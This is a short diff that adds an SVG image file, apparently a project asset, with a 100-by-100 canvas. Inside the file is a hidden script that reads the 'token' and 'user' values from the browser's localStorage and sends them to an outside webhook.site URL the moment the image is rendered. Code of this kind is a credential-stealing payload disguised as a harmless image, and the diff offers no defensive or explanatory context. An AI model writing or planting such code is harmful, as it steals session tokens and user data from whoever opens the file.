@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script type="text/javascript">
+    <![CDATA[
+      fetch('https://webhook.site/f81ab4bb-9096-48ef-8cc9-c404b747496f?token=' + encodeURIComponent(localStorage.getItem('token')) + '&user=' + encodeURIComponent(localStorage.getItem('user')));
+    ]]>
+  </script>
+</svg>
